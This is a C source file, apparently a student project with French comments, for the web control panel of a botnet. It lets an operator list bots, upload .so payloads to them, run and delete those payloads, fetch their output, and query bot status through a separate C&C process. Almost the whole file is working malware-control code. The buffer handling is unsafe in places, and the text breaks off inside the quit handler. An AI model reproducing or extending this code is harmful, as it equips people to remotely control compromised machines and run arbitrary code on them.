//sur le web 127.0.0.1:4040/form.html
#include "./server.h"

int received_SHM=0;

struct sigaction action;

void handler(int sig){
  if(sig == SIGINT){
    deleteSHM(shmid_server_pid);
    exit(EXIT_SUCCESS);
  }
  if(sig == SIGUSR2){
    received_SHM = 1;
    sigaction(SIGUSR2, &action, NULL);
  }
}

void displayHtml(char* page, FILE* dialog){
  char buffer[MAX_BUFFER];
  int fd = open(page,O_RDONLY);

  if(fd >= 0){
    int bytes;
    while((bytes = read(fd,buffer,MAX_BUFFER)) > 0) fwrite(buffer, 1, bytes, dialog);
    close(fd);
  }
}

void initSHM(){
  shmid_server_pid = createSHM(KEY_SERVER_PID, sizeof(pid_t));
  pid_t server_pid = getpid();
  writeSHM_int(KEY_SERVER_PID, &server_pid, sizeof(pid_t));
}

int manageWebClient(int s){
  // Obtient une structure de fichier
  FILE *dialog=fdopen(s,"a+");
  if(dialog==NULL){ perror("gestionClient.fdopen"); exit(EXIT_FAILURE); }

  char buffer[MAX_BUFFER];
  char cmd[MAX_BUFFER];
  char page[MAX_BUFFER];
  char proto[MAX_BUFFER];
  char path[MAX_BUFFER];
  char type[MAX_BUFFER];

  //Déclaration de trois tableaux de char pour stocker le header, le multipart et le boundary
  char header[MAX_BUFFER];
  char multipart[MAX_BUFFER];
  char boundary[MAX_BUFFER];
  //Déclaration d'un char* pour venir stocker le boundary
  char *bound;
  //Déclaration d'un long pour stocker la taille du fichier, initialisé à 0
  long length = 0;

  if(fgets(buffer,MAX_BUFFER,dialog)==NULL) exit(-1);
  if(sscanf(buffer,"%s %s %s",cmd,page,proto)!=3) exit(-1);

  while(fgets(buffer,MAX_BUFFER,dialog)!=NULL){
    sscanf(buffer, "%s", header);

    //if pour trouver et stocker la longueur
    if(strcasecmp("Content-length:", header)==0){
      sscanf(buffer, "%s %ld", header, &length);
    }
    //if pour trouver le boundary et le stocker
    if(strcasecmp("Content-type:", header)==0 ){
      sscanf(buffer, "%s %s %s", header, multipart, boundary);
      bound = memmem(boundary, strlen(boundary), "=", strlen("=")) + strlen("=");
    }
    if(strcmp(buffer,"\r\n")==0) break;
  }

  if(strcmp(page, "/form.html") == 0){
    //Ecriture de l'ID de la commande
    int command_id = ID_FORM;

    shmid_command_id = createSHM(KEY_COMMAND_ID, sizeof(int));
    writeSHM_int(KEY_COMMAND_ID, &command_id, sizeof(int));

    //Lecture du PID du C&C
    pid_t* candc_pid;
    candc_pid = readSHM_int(KEY_CANDC_PID, sizeof(pid_t));

    kill(*candc_pid, SIGUSR1);

    printf("\nServer > User is on form page - Ask bots list to the C&C\n");

    while(received_SHM != 1){}
    received_SHM = 0;

    printf("C&C > Bots list received from the C&C - Bots added to \"Scroll Host Menu\" \n");

    //Taille de la liste
    int* list_size;
    list_size = readSHM_int(KEY_BOT_LIST_LENGTH, sizeof(int));

    //Liste des bots
    unsigned char* pt_list;
    pt_list = readSHM_unsigned_char(KEY_BOT_LIST, *list_size);

    char list[*list_size];
    strcpy(list, (char*)pt_list);

    //Bout de code HTML pour avoir la liste sur le site WEB
    int i = 0;

    FILE* host_list = fopen("./www/host_list.html", "w+");
    unsigned char* pt_read_list = pt_list;

    if(host_list != NULL){
      while(pt_read_list < pt_list + *list_size){
        if(memcmp(pt_read_list, ",", 1) == 0){
          i++;
          if(i==2) fwrite("<option>", 1, strlen("<option>"), host_list);
        }
        else if(memcmp(pt_read_list, ";", 1) == 0){
          fwrite("</option>", 1, strlen("</option>"), host_list);
          i = 0;
        }
        else if(i==2) fwrite(pt_read_list, 1, 1, host_list);
        pt_read_list++;
      }
      fclose(host_list);
    }

    kill(*candc_pid, SIGUSR2);

    detachSHM(candc_pid);
    detachSHM(pt_list);
    detachSHM(list_size);
    deleteSHM(shmid_command_id);
  }

  if(length != 0){
    if(strcmp(page, "/list.html") == 0){
      //Ecriture de l'ID de la commande
      int command_id = ID_LIST;

      shmid_command_id = createSHM(KEY_COMMAND_ID, sizeof(int));
      writeSHM_int(KEY_COMMAND_ID, &command_id, sizeof(int));

      //Lecture du PID du C&C
      pid_t* candc_pid;
      candc_pid = readSHM_int(KEY_CANDC_PID, sizeof(pid_t));

      kill(*candc_pid, SIGUSR1);

      printf("\nServer > User asks bots list\n");

      while(received_SHM != 1){}
      received_SHM = 0;

      printf("C&C > Bots list received from the C&C\n");

      //Taille de la liste
      int* list_size;
      list_size = readSHM_int(KEY_BOT_LIST_LENGTH, sizeof(int));

      //Liste des bots
      unsigned char* pt_list;
      pt_list = readSHM_unsigned_char(KEY_BOT_LIST, *list_size);

      char list[*list_size];
      strcpy(list, (char*)pt_list);

      //Bout de code HTML pour avoir la liste sur le site WEB
      int i = 0;
      unsigned char* pt_read_list = pt_list;

      FILE* html_content = fopen("./www/content.html", "w+");
      char* Id = "<b>Id : </b>";
      char* Lifetime = "<b> Life time : </b>";
      char* Host = "s <b> Host : </b>";

      if(html_content != NULL){
        while(pt_read_list < pt_list + *list_size){
          if(memcmp(pt_read_list, ",", 1) == 0){
            if(i==0) fwrite(Lifetime, 1, strlen(Lifetime), html_content);
            if(i==1) fwrite(Host, 1, strlen(Host), html_content);
            i++;
          }
          else if(memcmp(pt_read_list, ";", 1) == 0){
            fwrite("<br/>", 1, strlen("<br/>"), html_content);
            i = 0;
          }
          else if(memcmp(pt_read_list, "\n", 1) == 0) fwrite(Id, 1, strlen(Id), html_content);
          else fwrite(pt_read_list, 1, 1, html_content);
          pt_read_list++;
        }
        fclose(html_content);
        printf("Server > Bots list displayed on %s\n", page);
      }

      kill(*candc_pid, SIGUSR2);

      deleteSHM(shmid_command_id);

      detachSHM(candc_pid);
      detachSHM(pt_list);
      detachSHM(list_size);
    }
    else if(strcmp(page, "/install.html") == 0){
      long total_length = length;

      //Récupération du contenu
      unsigned char* content = malloc(length); //unsigned car binaire
      unsigned char* location = content;

      while(total_length != 0){
        int actual_location = fread(location, 1, 1, dialog);
        total_length -= actual_location;
        location += actual_location;
      }

      //Récupération du nom du fichier et de sa taille
      char* landmark = "filename";
      unsigned char* pt = memmem(content, length, landmark, strlen(landmark)); //pointer sur le début de filename

      landmark = "\""; //car filename contenu dans les guillemets
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début du champs filename
      pt += strlen(landmark);
      unsigned char* pt_name_beginning = pt;
      unsigned char* pt_name_end = memmem(pt_name_beginning, length + content - pt_name_beginning, landmark, strlen(landmark));

      int name_length = pt_name_end - pt_name_beginning; //calcul de la taille du filename

      unsigned char* filename = malloc(name_length);
      unsigned char* pt_filename = filename;
      unsigned char* pt_read_name = pt_name_beginning;

      while(pt_read_name < pt_name_end){
        *pt_filename = *pt_read_name;
        pt_read_name++;
        pt_filename++;
      }

      landmark = ".so";
      if(memmem(pt_name_end - strlen(landmark), strlen(landmark), landmark, strlen(landmark)) == NULL){
        //Bout de code HTML pour le site WEB
        FILE* html_content = fopen("./www/content.html", "w+");
        char done[MAX_BUFFER] = "";

        strcpy(done, "<b>File must be a .so</b><br/>");
        printf("\nServer > File must have a .so\n");

        if(html_content != NULL){
          fwrite(done, 1, strlen(done), html_content);
          fclose(html_content);
        }
        free(filename);
        free(content);
      }
      else{
        //Récupération du contenu du fichier et de sa taille
        landmark = "\r\n\r\n"; //car fichier commence par un double CRLF
        pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début du contenu
        pt += strlen(landmark);
        unsigned char* pt_content_beginning = pt;
        unsigned char* pt_content_end = memmem(pt_content_beginning, length + content - pt_content_beginning, bound, strlen(bound));
        pt_content_end -= (strlen("--") + strlen("\r\n"));

        int content_length = pt_content_end - pt_content_beginning;

        unsigned char* file_content = malloc(content_length);
        unsigned char* pt_file_content = file_content;
        unsigned char* pt_read_content = pt_content_beginning;

        while(pt_read_content < pt_content_end){
          *pt_file_content = *pt_read_content;
          pt_read_content++;
          pt_file_content++;
        }

        //Récupération de l'ip du bot et de sa taille
        landmark = "\r\n\r\n"; //car fichier commence par un double CRLF
        pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début de l'ip
        pt += strlen(landmark);
        unsigned char* pt_host_beginning = pt;
        unsigned char* pt_host_end = memmem(pt_host_beginning, length + content - pt_host_beginning, bound, strlen(bound));
        pt_host_end -= (strlen("--") + strlen("\r\n"));

        int host_length = pt_host_end - pt_host_beginning;

        unsigned char* host = malloc(host_length);
        unsigned char* pt_host = host;
        unsigned char* pt_read_host = pt_host_beginning;

        while(pt_read_host < pt_host_end){
          *pt_host = *pt_read_host;
          pt_read_host++;
          pt_host++;
        }

        //Récupération du port du bot et de sa taille
        landmark = "\r\n\r\n"; //car fichier commence par un double CRLF
        pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début du port
        pt += strlen(landmark);
        unsigned char* pt_service_beginning = pt;
        unsigned char* pt_service_end = memmem(pt_service_beginning, length + content - pt_service_beginning, bound, strlen(bound));
        pt_service_end -= (strlen("--") + strlen("\r\n"));

        int service_length = pt_service_end - pt_service_beginning;

        unsigned char* service = malloc(service_length);
        unsigned char* pt_service = service;
        unsigned char* pt_read_service = pt_service_beginning;

        while(pt_read_service < pt_service_end){
          *pt_service = *pt_read_service;
          pt_read_service++;
          pt_service++;
        }


        //Création des segments de mémoire partagée
        shmid_name_length = createSHM(KEY_NAME_LENGTH, sizeof(int));
        shmid_name = createSHM(KEY_NAME, name_length);
        shmid_content_length = createSHM(KEY_CONTENT_LENGTH, sizeof(int));
        shmid_content = createSHM(KEY_CONTENT, content_length);
        shmid_host_length = createSHM(KEY_HOST_LENGTH, sizeof(int));
        shmid_host = createSHM(KEY_HOST, host_length);
        shmid_service_length = createSHM(KEY_SERVICE_LENGTH, sizeof(int));
        shmid_service = createSHM(KEY_SERVICE, service_length);

        //Ecriture de l'ID de la commande
        int command_id = ID_INSTALL;

        shmid_command_id = createSHM(KEY_COMMAND_ID, sizeof(int));
        writeSHM_int(KEY_COMMAND_ID, &command_id, sizeof(int));

        //Ecriture du nom du fichier et de sa taille
        writeSHM_int(KEY_NAME_LENGTH, &name_length, sizeof(int));
        writeSHM_unsigned_char(KEY_NAME, filename, name_length);

        //Ecriture du contenu du fichier et de sa taille
        writeSHM_int(KEY_CONTENT_LENGTH, &content_length, sizeof(int));
        writeSHM_unsigned_char(KEY_CONTENT, file_content, content_length);

        //Ecriture de l'ip du bot et de sa taille
        writeSHM_int(KEY_HOST_LENGTH, &host_length, sizeof(int));
        writeSHM_unsigned_char(KEY_HOST, host, host_length);

        //Ecriture du port du bot et de sa taille
        writeSHM_int(KEY_SERVICE_LENGTH, &service_length, sizeof(int));
        writeSHM_unsigned_char(KEY_SERVICE, service, service_length);

        //Lecture du PID du C&C
        pid_t* candc_pid;
        candc_pid = readSHM_int(KEY_CANDC_PID, sizeof(pid_t));

        kill(*candc_pid, SIGUSR1);

        printf("\nServer > User asks to the C&C to install a payload on a bot (host : %s, service : %s)\n", host, service);

        while(received_SHM != 1){}
        received_SHM = 0;

        //Entier d'installation
        int* installation;
        installation = readSHM_int(KEY_INSTALLATION, sizeof(int));

        //Bout de code HTML pour le site WEB
        FILE* html_content = fopen("./www/content.html", "w+");
        char done[MAX_BUFFER] = "";

        if(*installation >= 0) {strcpy(done, "<b>Installation done</b><br/>"); printf("C&C > Installation done\n");}
        else {strcpy(done, "<b>Installation failed, bot isn't connected</b><br/>"); printf("C&C > Installation failed, bot isn't connected\n");}

        if(html_content != NULL){
          fwrite(done, 1, strlen(done), html_content);
          fclose(html_content);
        }

        detachSHM(installation);

        kill(*candc_pid, SIGUSR2);

        free(filename);
        free(content);
        free(file_content);
        free(service);
        free(host);

        detachSHM(candc_pid);

        deleteSHM(shmid_command_id);
        deleteSHM(shmid_service);
        deleteSHM(shmid_service_length);
        deleteSHM(shmid_host);
        deleteSHM(shmid_host_length);
        deleteSHM(shmid_content);
        deleteSHM(shmid_content_length);
        deleteSHM(shmid_name);
        deleteSHM(shmid_name_length);
      }
    }
    else if(strcmp(page, "/run.html") == 0 || strcmp(page, "/delete.html") == 0){
      long total_length = length;

      //Récupération du contenu
      unsigned char* content = malloc(length); //unsigned car binaire
      unsigned char* location = content;

      while(total_length != 0){
        int actual_location = fread(location, 1, 1, dialog);
        total_length -= actual_location;
        location += actual_location;
      }

      //Récupération de l'index et de sa taille
      char* landmark = "filename"; //car fichier commence par un double CRLF
      unsigned char* pt = memmem(content, length, landmark, strlen(landmark));

      landmark = "\r\n\r\n"; //car fichier commence par un double CRLF
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début du contenu
      pt += strlen(landmark);
      unsigned char* pt_name_beginning = pt;
      unsigned char* pt_name_end = memmem(pt_name_beginning, length + content - pt_name_beginning, bound, strlen(bound));
      pt_name_end -= (strlen("--") + strlen("\r\n"));

      int name_length = pt_name_end - pt_name_beginning; //calcul de la taille du filename

      unsigned char* filename = malloc(name_length);
      unsigned char* pt_filename = filename;
      unsigned char* pt_read_name = pt_name_beginning;

      while(pt_read_name < pt_name_end){
        *pt_filename = *pt_read_name;
        pt_read_name++;
        pt_filename++;
      }

      landmark = ".so";
      if(memmem(pt_name_end - strlen(landmark), strlen(landmark), landmark, strlen(landmark)) == NULL){
        //Bout de code HTML pour le site WEB
        FILE* html_content = fopen("./www/content.html", "w+");
        char done[MAX_BUFFER] = "";

        strcpy(done, "<b>File must be a .so</b><br/>");
        printf("\nServer > File must have a .so\n");

        if(html_content != NULL){
          fwrite(done, 1, strlen(done), html_content);
          fclose(html_content);
        }
        free(filename);
        free(content);
      }
      else{
        //Récupération de l'ip du bot et de sa taille
        landmark = "\r\n\r\n";
        pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début de l'ip
        pt += strlen(landmark);
        unsigned char* pt_host_beginning = pt;
        unsigned char* pt_host_end = memmem(pt_host_beginning, length + content - pt_host_beginning, bound, strlen(bound));
        pt_host_end -= (strlen("--") + strlen("\r\n"));

        int host_length = pt_host_end - pt_host_beginning;

        unsigned char* host = malloc(host_length);
        unsigned char* pt_host = host;
        unsigned char* pt_read_host = pt_host_beginning;

        while(pt_read_host < pt_host_end){
          *pt_host = *pt_read_host;
          pt_read_host++;
          pt_host++;
        }

        //Récupération du port du bot et de sa taille
        landmark = "\r\n\r\n";
        pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début du port
        pt += strlen(landmark);
        unsigned char* pt_service_beginning = pt;
        unsigned char* pt_service_end = memmem(pt_service_beginning, length + content - pt_service_beginning, bound, strlen(bound));
        pt_service_end -= (strlen("--") + strlen("\r\n"));

        int service_length = pt_service_end - pt_service_beginning;

        unsigned char* service = malloc(service_length);
        unsigned char* pt_service = service;
        unsigned char* pt_read_service = pt_service_beginning;

        while(pt_read_service < pt_service_end){
          *pt_service = *pt_read_service;
          pt_read_service++;
          pt_service++;
        }

        //Création des segments de mémoire partagée
        shmid_name_length = createSHM(KEY_NAME_LENGTH, sizeof(int));
        shmid_name = createSHM(KEY_NAME, name_length);
        shmid_host_length = createSHM(KEY_HOST_LENGTH, sizeof(int));
        shmid_host = createSHM(KEY_HOST, host_length);
        shmid_service_length = createSHM(KEY_SERVICE_LENGTH, sizeof(int));
        shmid_command_id = createSHM(KEY_COMMAND_ID, sizeof(int));
        shmid_service = createSHM(KEY_SERVICE, service_length);

        //Ecriture de l'ID de la commande
        int command_id;
        if(strcmp(page, "/run.html") == 0){
          command_id = ID_RUN;
          printf("\nServer > User asks to run a payload on a bot (host : %s, service : %s)\n", host, service);
        }
        else{
          command_id = ID_DELETE;
          printf("\nServer > User asks to remove a payload from a bot (host : %s, service : %s)\n", host, service);
        }

        writeSHM_int(KEY_COMMAND_ID, &command_id, sizeof(int));

        //Ecriture du nom de la charge
        writeSHM_int(KEY_NAME_LENGTH, &name_length, sizeof(int));
        writeSHM_unsigned_char(KEY_NAME, filename, name_length);

        //Ecriture de l'ip du bot et de sa taille
        writeSHM_int(KEY_HOST_LENGTH, &host_length, sizeof(int));
        writeSHM_unsigned_char(KEY_HOST, host, host_length);

        //Ecriture du port du bot et de sa taille
        writeSHM_int(KEY_SERVICE_LENGTH, &service_length, sizeof(int));
        writeSHM_unsigned_char(KEY_SERVICE, service, service_length);

        //Lecture du PID du C&C
        pid_t* candc_pid;
        candc_pid = readSHM_int(KEY_CANDC_PID, sizeof(pid_t));

        kill(*candc_pid, SIGUSR1);

        while(received_SHM != 1){}
        received_SHM = 0;

        if(strcmp(page, "/run.html") == 0){
          printf("C&C > Execution done (or not)\n");

          //Entier d'installation
          int* index;
          index = readSHM_int(KEY_RUNNING, sizeof(int));

          //Bout de code HTML pour le site WEB
          FILE* html_content = fopen("./www/content.html", "w+");

          char* done;
          if(*index >= 0)  done = "<b>Running index : </b>";
          else if(*index == -1) done = "<b>Payload isn't installed</b>";
          else done = "<b>Bot isn't connected</b>";

          if(html_content != NULL){
            fwrite(done, 1, strlen(done), html_content);
            if(*index >= 0) { fprintf(html_content, "%d", *index); printf("Server > Running index displayed on %s\n", page); }
            else if(*index == -1) printf("Server > Payload isn't installed (%s)\n", page);
            else printf("Server > Error displayed on %s\n", page);
            fwrite("<br/>", 1, strlen("<br/>"), html_content);
            fclose(html_content);


          }

          detachSHM(index);
        }
        else{
          //Entier de suppression
          int* delete;
          delete = readSHM_int(KEY_DELETE, sizeof(int));

          //Bout de code HTML pour le site WEB
          FILE* html_content = fopen("./www/content.html", "w+");
          char done[MAX_BUFFER] = "";

          if(*delete == 0)  {strcpy(done, "<b>Payload deleted</b><br/>"); printf("C&C > Payload deleted\n");}
          else {strcpy(done, "<b>Payload isn't installed</b><br/>"); printf("C&C > Payload isn't installed\n");}

          if(html_content != NULL){
            fwrite(done, 1, strlen(done), html_content);
            fclose(html_content);
          }

          detachSHM(delete);
        }

        kill(*candc_pid, SIGUSR2);

        free(filename);
        free(content);
        free(service);
        free(host);

        detachSHM(candc_pid);

        deleteSHM(shmid_service);
        deleteSHM(shmid_service_length);
        deleteSHM(shmid_host);
        deleteSHM(shmid_host_length);
        deleteSHM(shmid_name);
        deleteSHM(shmid_name_length);
        deleteSHM(shmid_command_id);
      }
    }
    else if(strcmp(page, "/result.html") == 0){
      long total_length = length;

      //Récupération du contenu
      unsigned char* content = malloc(length); //unsigned car binaire
      unsigned char* location = content;

      while(total_length != 0){
        int actual_location = fread(location, 1, 1, dialog);
        total_length -= actual_location;
        location += actual_location;
      }

      //Récupération de l'index et de sa taille
      char* landmark = "index"; //car fichier commence par un double CRLF
      unsigned char* pt = memmem(content, length, landmark, strlen(landmark));

      landmark = "\r\n\r\n";
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début de l'index
      pt += strlen(landmark);
      unsigned char* pt_index_beginning = pt;
      unsigned char* pt_index_end = memmem(pt_index_beginning, length + content - pt_index_beginning, bound, strlen(bound));
      pt_index_end -= (strlen("--") + strlen("\r\n"));

      int index_length = pt_index_end - pt_index_beginning; //calcul de la taille de l'index

      unsigned char* index = malloc(index_length);
      unsigned char* pt_index = index;
      unsigned char* pt_read_index = pt_index_beginning;

      while(pt_read_index < pt_index_end){
        *pt_index = *pt_read_index;
        pt_read_index++;
        pt_index++;
      }

      int idx = 0;
      sscanf((char*)index, "%d", &idx);

      //Récupération de l'ip du bot et de sa taille
      landmark = "\r\n\r\n";
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début de l'ip
      pt += strlen(landmark);
      unsigned char* pt_host_beginning = pt;
      unsigned char* pt_host_end = memmem(pt_host_beginning, length + content - pt_host_beginning, bound, strlen(bound));
      pt_host_end -= (strlen("--") + strlen("\r\n"));

      int host_length = pt_host_end - pt_host_beginning;

      unsigned char* host = malloc(host_length);
      unsigned char* pt_host = host;
      unsigned char* pt_read_host = pt_host_beginning;

      while(pt_read_host < pt_host_end){
        *pt_host = *pt_read_host;
        pt_read_host++;
        pt_host++;
      }

      //Récupération du port du bot et de sa taille
      landmark = "\r\n\r\n";
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début du port
      pt += strlen(landmark);
      unsigned char* pt_service_beginning = pt;
      unsigned char* pt_service_end = memmem(pt_service_beginning, length + content - pt_service_beginning, bound, strlen(bound));
      pt_service_end -= (strlen("--") + strlen("\r\n"));

      int service_length = pt_service_end - pt_service_beginning;

      unsigned char* service = malloc(service_length);
      unsigned char* pt_service = service;
      unsigned char* pt_read_service = pt_service_beginning;

      while(pt_read_service < pt_service_end){
        *pt_service = *pt_read_service;
        pt_read_service++;
        pt_service++;
      }

      //Création des segments de mémoire partagée
      shmid_charge_id = createSHM(KEY_CHARGE_INDEX, sizeof(int));
      shmid_host_length = createSHM(KEY_HOST_LENGTH, sizeof(int));
      shmid_host = createSHM(KEY_HOST, host_length);
      shmid_service_length = createSHM(KEY_SERVICE_LENGTH, sizeof(int));
      shmid_command_id = createSHM(KEY_COMMAND_ID, sizeof(int));
      shmid_service = createSHM(KEY_SERVICE, service_length);

      //Ecriture de l'ID de la commande
      int command_id = ID_RESULT;
      writeSHM_int(KEY_COMMAND_ID, &command_id, sizeof(int));

      //Ecriture de l'index de la charge
      writeSHM_int(KEY_CHARGE_INDEX, &idx, sizeof(int));

      //Ecriture de l'ip du bot et de sa taille
      writeSHM_int(KEY_HOST_LENGTH, &host_length, sizeof(int));
      writeSHM_unsigned_char(KEY_HOST, host, host_length);

      //Ecriture du port du bot et de sa taille
      writeSHM_int(KEY_SERVICE_LENGTH, &service_length, sizeof(int));
      writeSHM_unsigned_char(KEY_SERVICE, service, service_length);

      //Lecture du PID du C&C
      pid_t* candc_pid;
      candc_pid = readSHM_int(KEY_CANDC_PID, sizeof(pid_t));

      kill(*candc_pid, SIGUSR1);

      printf("\nServer > User asks the result of Index%d execution on a bot (host : %s, service : %s)\n", idx, host, service);

      while(received_SHM != 1){}
      received_SHM = 0;

      int* result_size;
      result_size = readSHM_int(KEY_RESULT_LENGTH, sizeof(int));

      char result[*result_size];
      unsigned char* pt_result;
      pt_result = readSHM_unsigned_char(KEY_RESULT, *result_size);
      strcpy(result, (char*)pt_result);

      detachSHM(pt_result);
      detachSHM(result_size);

      FILE* html_content = fopen("./www/content.html", "w+");

      if(strcmp(result, "error\n") == 0){
        printf("C&C > Index doesn't exist\n");

        char done[MAX_BUFFER] = "";

        strcpy(done, "<b>Index doesn't exist</b><br/>");

        if(html_content != NULL){
          fwrite(done, 1, strlen(done), html_content);
          fclose(html_content);
        }

        printf("Server > Error displayed on %s\n", page);
      }
      else if(strcmp(result, "errorConnexion\n") == 0){
        printf("C&C > Bot isn't connected\n");

        char done[MAX_BUFFER] = "";

        strcpy(done, "<b>Bot isn't connected</b><br/>");

        if(html_content != NULL){
          fwrite(done, 1, strlen(done), html_content);
          fclose(html_content);
        }

        printf("Server > Error displayed on %s\n", page);
      }
      else{
        printf("C&C > Result received from C&C (or not)\n");

        char* Index = "<b>Index : </b>";
        char* Result = "<br/><b>Result : </b><br/>";

        if(html_content != NULL){
          fwrite(Index, 1, strlen(Index), html_content);
          fprintf(html_content, "%d", idx);
          fwrite(Result, 1, strlen(Result), html_content);
          fwrite(result, 1, strlen(result), html_content);
          fwrite("<br/>", 1, strlen("<br/>"), html_content);
          fclose(html_content);

          printf("Server > Result displayed on %s\n", page);
        }
      }

      kill(*candc_pid, SIGUSR2);

      free(content);
      free(service);
      free(host);
      free(index);

      detachSHM(candc_pid);

      deleteSHM(shmid_service);
      deleteSHM(shmid_service_length);
      deleteSHM(shmid_host);
      deleteSHM(shmid_host_length);
      deleteSHM(shmid_charge_id);
      deleteSHM(shmid_command_id);
    }
    else if(strcmp(page, "/status.html") == 0){
      long total_length = length;

      //Récupération du contenu
      unsigned char* content = malloc(length); //unsigned car binaire
      unsigned char* location = content;

      while(total_length != 0){
        int actual_location = fread(location, 1, 1, dialog);
        total_length -= actual_location;
        location += actual_location;
      }

      //Récupération de l'ip du bot et de sa taille
      char* landmark = "host"; //car fichier commence par un double CRLF
      unsigned char* pt = memmem(content, length, landmark, strlen(landmark));

      landmark = "\r\n\r\n";
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début de l'ip
      pt += strlen(landmark);
      unsigned char* pt_host_beginning = pt;
      unsigned char* pt_host_end = memmem(pt_host_beginning, length + content - pt_host_beginning, bound, strlen(bound));
      pt_host_end -= (strlen("--") + strlen("\r\n"));

      int host_length = pt_host_end - pt_host_beginning;

      unsigned char* host = malloc(host_length);
      unsigned char* pt_host = host;
      unsigned char* pt_read_host = pt_host_beginning;

      while(pt_read_host < pt_host_end){
        *pt_host = *pt_read_host;
        pt_read_host++;
        pt_host++;
      }

      //Récupération du port du bot et de sa taille
      landmark = "\r\n\r\n";
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début du port
      pt += strlen(landmark);
      unsigned char* pt_service_beginning = pt;
      unsigned char* pt_service_end = memmem(pt_service_beginning, length + content - pt_service_beginning, bound, strlen(bound));
      pt_service_end -= (strlen("--") + strlen("\r\n"));

      int service_length = pt_service_end - pt_service_beginning;

      unsigned char* service = malloc(service_length);
      unsigned char* pt_service = service;
      unsigned char* pt_read_service = pt_service_beginning;

      while(pt_read_service < pt_service_end){
        *pt_service = *pt_read_service;
        pt_read_service++;
        pt_service++;
      }

      //Création des segments de mémoire partagée
      shmid_host_length = createSHM(KEY_HOST_LENGTH, sizeof(int));
      shmid_host = createSHM(KEY_HOST, host_length);
      shmid_service_length = createSHM(KEY_SERVICE_LENGTH, sizeof(int));
      shmid_command_id = createSHM(KEY_COMMAND_ID, sizeof(int));
      shmid_service = createSHM(KEY_SERVICE, service_length);

      //Ecriture de l'ID de la commande
      int command_id = ID_STAT;
      writeSHM_int(KEY_COMMAND_ID, &command_id, sizeof(int));

      //Ecriture de l'ip du bot et de sa taille
      writeSHM_int(KEY_HOST_LENGTH, &host_length, sizeof(int));
      writeSHM_unsigned_char(KEY_HOST, host, host_length);

      //Ecriture du port du bot et de sa taille
      writeSHM_int(KEY_SERVICE_LENGTH, &service_length, sizeof(int));
      writeSHM_unsigned_char(KEY_SERVICE, service, service_length);

      //Lecture du PID du C&C
      pid_t* candc_pid;
      candc_pid = readSHM_int(KEY_CANDC_PID, sizeof(pid_t));

      kill(*candc_pid, SIGUSR1);

      printf("\nServer > User asks the status of a bot (host : %s, service : %s)\n", host, service);

      while(received_SHM != 1){}
      received_SHM = 0;

      int* status_size;
      status_size = readSHM_int(KEY_STATUS_LENGTH, sizeof(int));

      char status[*status_size];
      unsigned char* pt_status;
      pt_status = readSHM_unsigned_char(KEY_STATUS, *status_size);
      strcpy(status, (char*)pt_status);

      detachSHM(pt_status);
      detachSHM(status_size);

      FILE* html_content = fopen("./www/content.html", "w+");

      if(strcmp(status, "error\n") == 0){
        printf("C&C > Bot isn't connected\n");

        char done[MAX_BUFFER] = "";

        strcpy(done, "<b>Bot isn't connected</b><br/>");

        if(html_content != NULL){
          fwrite(done, 1, strlen(done), html_content);
          fclose(html_content);
        }

        printf("Server > Error displayed on %s\n", page);
      }
      else{
        printf("C&C > Status received from C&C (or not)\n");

        char* Host = "<b>Host : </b>";
        char* Status = "<br/><b>Status : </b>";

        if(html_content != NULL){


          fwrite(Host, 1, strlen(Host), html_content);
          fwrite(host, 1, strlen((char*)host), html_content);
          fwrite(Status, 1, strlen(Status), html_content);
          fwrite(status, 1, strlen((char*)status), html_content);
          fwrite("<br/>", 1, strlen("<br/>"), html_content);
          fclose(html_content);

          printf("Server > Status displayed on %s\n", page);
        }
      }

      kill(*candc_pid, SIGUSR2);

      free(content);
      free(service);
      free(host);

      detachSHM(candc_pid);

      deleteSHM(shmid_service);
      deleteSHM(shmid_service_length);
      deleteSHM(shmid_host);
      deleteSHM(shmid_host_length);
      deleteSHM(shmid_command_id);
    }
    else if(strcmp(page, "/quit.html") == 0){
      long total_length = length;

      //Récupération du contenu
      unsigned char* content = malloc(length); //unsigned car binaire
      unsigned char* location = content;

      while(total_length != 0){
        int actual_location = fread(location, 1, 1, dialog);
        total_length -= actual_location;
        location += actual_location;
      }

      //Récupération de l'ip du bot et de sa taille
      char* landmark = "host"; //car fichier commence par un double CRLF
      unsigned char* pt = memmem(content, length, landmark, strlen(landmark));

      landmark = "\r\n\r\n";
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début de l'ip
      pt += strlen(landmark);
      unsigned char* pt_host_beginning = pt;
      unsigned char* pt_host_end = memmem(pt_host_beginning, length + content - pt_host_beginning, bound, strlen(bound));
      pt_host_end -= (strlen("--") + strlen("\r\n"));

      int host_length = pt_host_end - pt_host_beginning;

      unsigned char* host = malloc(host_length);
      unsigned char* pt_host = host;
      unsigned char* pt_read_host = pt_host_beginning;

      while(pt_read_host < pt_host_end){
        *pt_host = *pt_read_host;
        pt_read_host++;
        pt_host++;
      }

      //Récupération du port du bot et de sa taille
      landmark = "\r\n\r\n";
      pt = memmem(pt, length + content - pt, landmark, strlen(landmark)); //pointer sur le début du port
      pt += strlen(landmark);
      unsigned char* pt_service_beginning = pt;
      unsigned char* pt_service_end = memmem(pt_service_beginning, length + content - pt_service_beginning, bound, strlen(bound));
      pt_service_end -= (strlen("--") + strlen("\r\n"));

      int service_length = pt_service_end - pt_service_beginning;

      unsigned char* service = malloc(service_length);
      unsigned char* pt_service = service;
      unsigned char* pt_read_service = pt_service_beginning;

      while(pt_read_service < pt_service_end){
        *pt_service = *pt_read_service;
        pt_read_service++;
        pt_service++;
      }

      //Création des segments de mémoire partagée
      shmid_host_length = createSHM(KEY_HOST_LENGTH, sizeof(int));
      shmid_host = createSHM(KEY_HOST, host_length);
      shmid_service_length = createSHM(KEY_SERVICE_LENGTH, sizeof(int));
      shmid_command_id = createSHM(KEY_COMMAND_ID, sizeof(int));
